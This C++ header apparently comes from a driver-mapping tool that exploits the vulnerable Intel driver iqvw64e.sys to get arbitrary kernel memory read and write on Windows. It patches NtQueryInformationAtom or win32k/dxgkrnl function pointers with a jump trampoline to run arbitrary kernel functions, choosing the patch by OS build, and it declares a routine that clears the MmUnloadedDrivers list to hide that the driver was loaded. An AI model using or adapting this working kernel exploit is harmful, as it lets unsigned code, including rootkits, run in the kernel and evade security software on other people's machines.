#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <atlstr.h>

#include "intel_driver_resource.hpp"
#include "service.hpp"
#include "utils.hpp"
#include <assert.h>

namespace intel_driver
{
	constexpr auto driver_name = "iqvw64e.sys";
	constexpr uint32_t ioctl1 = 0x80862007;

	typedef struct _COPY_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t source;
		uint64_t destination;
		uint64_t length;
	}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

	typedef struct _FILL_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint32_t value;
		uint32_t reserved2;
		uint64_t destination;
		uint64_t length;
	}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;

	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_physical_address;
		uint64_t address_to_translate;
	}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

	typedef struct _MAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_value;
		uint64_t return_virtual_address;
		uint64_t physical_address_to_map;
		uint32_t size;
	}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint64_t reserved2;
		uint64_t virt_address;
		uint64_t reserved3;
		uint32_t number_of_bytes;
	}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;

	HANDLE load();
	void unload(HANDLE device_handle);

	bool copy_memory(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size);
	bool set_memory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size);
	bool get_physical_address(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address);
	uint64_t mm_map_io_space(HANDLE device_handle, uint64_t physical_address, uint32_t size);
	bool mm_unmap_io_space(HANDLE device_handle, uint64_t address, uint32_t size);
	bool read_memory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool write_memory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool write_to_read_only_memory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size);
	uint64_t allocate_pool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size);
	bool free_pool(HANDLE device_handle, uint64_t address);
	uint64_t get_kernel_module_export(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name);
	bool get_NtGdiDdDDIReclaimAllocations2KernelInfo(HANDLE device_handle, uint64_t* out_kernel_function_ptr, uint64_t* out_kernel_original_function_address);
	bool get_NtGdiGetCOPPCompatibleOPMInformationInfo(HANDLE device_handle, uint64_t* out_kernel_function_ptr, uint8_t* out_kernel_original_bytes);
	bool clear_mm_unloaded_drivers(HANDLE device_handle);

	template<typename T, typename ...A>
	bool call_kernel_function(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments)
	{
		constexpr auto call_void = std::is_same_v<T, void>;

		if constexpr (!call_void)
		{
			if (!out_result)
				return false;
		}
		else
		{
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		// Setup function call 

#pragma warning(disable : 4996)

		/*LPOSVERSIONINFOEXA info;
		ZeroMemory(&info, sizeof(LPOSVERSIONINFOEXA));
		info.dwOSVersionInfoSize = sizeof(LPOSVERSIONINFOEXA);

		GetVersionEx(&info);*/

		OSVERSIONINFO info = { 0 };
		info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		GetVersionEx(&info);

		const auto system_name = L"kernel32.dll";
		DWORD dummy;
		const auto cbInfo =
			::GetFileVersionInfoSizeExW(FILE_VER_GET_NEUTRAL, system_name, &dummy);
		std::vector<char> buffer(cbInfo);
		::GetFileVersionInfoExW(FILE_VER_GET_NEUTRAL, system_name, dummy,
			buffer.size(), &buffer[0]);
		void* p = nullptr;
		UINT size = 0;
		::VerQueryValueW(buffer.data(), L"\\", &p, &size);
		assert(size >= sizeof(VS_FIXEDFILEINFO));
		assert(p != nullptr);
		auto pFixed = static_cast<const VS_FIXEDFILEINFO*>(p);
		std::cout << "[+] " << HIWORD(pFixed->dwFileVersionMS) << '.'
			<< LOWORD(pFixed->dwFileVersionMS) << '.'
			<< HIWORD(pFixed->dwFileVersionLS) << '.'
			<< LOWORD(pFixed->dwFileVersionLS) << '\n';

		//19041
		if (HIWORD(pFixed->dwFileVersionLS) >= 19041) {
			const auto NtQueryInformationAtom = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("ntdll.dll"), "NtQueryInformationAtom"));
			if (!NtQueryInformationAtom)
			{
				std::cout << "[-] Failed to get export ntdll.NtQueryInformationAtom" << std::endl;
				return false;
			}

			uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
			uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
			*(uint64_t*)((&kernel_injected_jmp[0]) + 2) = kernel_function_address;

			const uint64_t kernel_NtQueryInformationAtom = get_kernel_module_export(device_handle, utils::get_kernel_module_address("ntoskrnl.exe"), "NtQueryInformationAtom");
			if (!kernel_NtQueryInformationAtom)
			{
				std::cout << "[-] Failed to get export ntoskrnl.NtQueryInformationAtom" << std::endl;
				return false;
			}
			
			if (!read_memory(device_handle, kernel_NtQueryInformationAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
				return false;

			// Overwrite the pointer with kernel_function_address
			if (!write_to_read_only_memory(device_handle, kernel_NtQueryInformationAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
				return false;

			// Call function
			if constexpr (!call_void)
			{
				using FunctionFn = T(__stdcall*)(A...);
				const auto Function = reinterpret_cast<FunctionFn>(NtQueryInformationAtom);

				*out_result = Function(arguments...);
			}
			else
			{
				using FunctionFn = void(__stdcall*)(A...);
				const auto Function = reinterpret_cast<FunctionFn>(NtQueryInformationAtom);

				Function(arguments...);
			}

			// Restore the pointer/jmp
			write_to_read_only_memory(device_handle, kernel_NtQueryInformationAtom, original_kernel_function, sizeof(kernel_injected_jmp));
			return true;

		}
		else if (HIWORD(pFixed->dwFileVersionLS) >= 18362) {
			const auto NtGdiDdDDIReclaimAllocations2 = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("gdi32full.dll"), "NtGdiDdDDIReclaimAllocations2"));
			const auto NtGdiGetCOPPCompatibleOPMInformation = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("win32u.dll"), "NtGdiGetCOPPCompatibleOPMInformation"));

			if (!NtGdiDdDDIReclaimAllocations2 && !NtGdiGetCOPPCompatibleOPMInformation)
			{
				std::cout << "[-] Failed to get export gdi32full.NtGdiDdDDIReclaimAllocations2 / win32u.NtGdiGetCOPPCompatibleOPMInformation" << std::endl;
				return false;
			}

			uint64_t kernel_function_ptr = 0;
			uint8_t kernel_function_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
			uint64_t kernel_original_function_address = 0;
			uint8_t kernel_original_function_jmp[sizeof(kernel_function_jmp)];

			if (NtGdiDdDDIReclaimAllocations2)
			{
				// Get function pointer (@win32kbase!gDxgkInterface table) used by NtGdiDdDDIReclaimAllocations2 and save the original address (dxgkrnl!DxgkReclaimAllocations2)
				if (!get_NtGdiDdDDIReclaimAllocations2KernelInfo(device_handle, &kernel_function_ptr, &kernel_original_function_address))
					return false;

				// Overwrite the pointer with kernel_function_address
				if (!write_to_read_only_memory(device_handle, kernel_function_ptr, &kernel_function_address, sizeof(kernel_function_address)))
					return false;
			}
			else
			{
				// Get address of NtGdiGetCOPPCompatibleOPMInformation and save the original jmp bytes + 0xCC filler
				if (!get_NtGdiGetCOPPCompatibleOPMInformationInfo(device_handle, &kernel_function_ptr, kernel_original_function_jmp))
					return false;

				// Overwrite jmp with 'movabs rax, <kernel_function_address>, jmp rax'
				memcpy(kernel_function_jmp + 2, &kernel_function_address, sizeof(kernel_function_address));

				if (!write_to_read_only_memory(device_handle, kernel_function_ptr, kernel_function_jmp, sizeof(kernel_function_jmp)))
					return false;
			}

			// Call function 

			if constexpr (!call_void)
			{
				using FunctionFn = T(__stdcall*)(A...);
				const auto Function = reinterpret_cast<FunctionFn>(NtGdiDdDDIReclaimAllocations2 ? NtGdiDdDDIReclaimAllocations2 : NtGdiGetCOPPCompatibleOPMInformation);

				*out_result = Function(arguments...);
			}
			else
			{
				using FunctionFn = void(__stdcall*)(A...);
				const auto Function = reinterpret_cast<FunctionFn>(NtGdiDdDDIReclaimAllocations2 ? NtGdiDdDDIReclaimAllocations2 : NtGdiGetCOPPCompatibleOPMInformation);

				Function(arguments...);
			}

			// Restore the pointer/jmp
			if (NtGdiDdDDIReclaimAllocations2)
			{
				write_to_read_only_memory(device_handle, kernel_function_ptr, &kernel_original_function_address, sizeof(kernel_original_function_address));
			}
			else
			{
				write_to_read_only_memory(device_handle, kernel_function_ptr, kernel_original_function_jmp, sizeof(kernel_original_function_jmp));
			}
			return true;
		}
		else if (HIWORD(pFixed->dwFileVersionLS) >= 17134) {
			const auto NtGdiDdDDIReclaimAllocations2 = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("gdi32full.dll"), "NtGdiDdDDIReclaimAllocations2"));

			if (!NtGdiDdDDIReclaimAllocations2)
			{
				std::cout << "[-] Failed to get export gdi32full.NtGdiDdDDIReclaimAllocations2" << std::endl;
				return false;
			}

			// Get function pointer (@win32kbase!gDxgkInterface table) used by NtGdiDdDDIReclaimAllocations2 and save the original address (dxgkrnl!DxgkReclaimAllocations2)

			uint64_t kernel_function_ptr = 0;
			uint64_t kernel_original_function_address = 0;

			if (!get_NtGdiDdDDIReclaimAllocations2KernelInfo(device_handle, &kernel_function_ptr, &kernel_original_function_address))
				return false;

			// Overwrite the pointer with kernel_function_address

			if (!write_to_read_only_memory(device_handle, kernel_function_ptr, &kernel_function_address, sizeof(kernel_function_address)))
				return false;

			// Call function 

			if constexpr (!call_void)
			{
				using FunctionFn = T(__stdcall*)(A...);
				const auto Function = static_cast<FunctionFn>(NtGdiDdDDIReclaimAllocations2);

				*out_result = Function(arguments...);
			}
			else
			{
				using FunctionFn = void(__stdcall*)(A...);
				const auto Function = static_cast<FunctionFn>(NtGdiDdDDIReclaimAllocations2);

				Function(arguments...);
			}

			// Restore the pointer

			write_to_read_only_memory(device_handle, kernel_function_ptr, &kernel_original_function_address, sizeof(kernel_original_function_address));
			return true;
		}

		return false;
	}
}
